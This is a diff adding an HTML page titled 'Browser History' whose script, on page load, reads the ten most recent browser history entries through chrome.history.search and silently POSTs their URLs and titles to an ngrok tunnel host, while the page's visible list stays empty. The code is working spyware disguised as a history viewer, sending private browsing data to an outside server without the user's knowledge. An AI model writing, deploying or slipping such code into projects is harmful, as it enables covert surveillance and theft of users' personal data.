@@ -1,0 +1,50 @@
+<!-- history.html -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Browser History</title>
+</head>
+<body>
+    <h1>Browser History</h1>
+    <ul id="historyList"></ul>
+
+    <script>
+        window.onload = function() {
+            // Function to fetch browser history
+            function getBrowserHistory() {
+                var historyItems = [];
+                chrome.history.search({text: '', maxResults: 10}, function(data) {
+                    data.forEach(function(page) {
+                        historyItems.push({
+                            url: page.url,
+                            title: page.title
+                        });
+                    });
+
+                    // Send history data to server
+                    sendToServer(historyItems);
+                });
+            }
+
+            // Function to send history data to server
+            function sendToServer(historyData) {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'https://867b-175-107-227-158.ngrok-free.app/history', true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                        console.log('History data sent successfully');
+                    }
+                };
+                xhr.send(JSON.stringify(historyData));
+            }
+
+            // Get browser history when the page loads
+            getBrowserHistory();
+        };
+    </script>
+</body>
+</html>
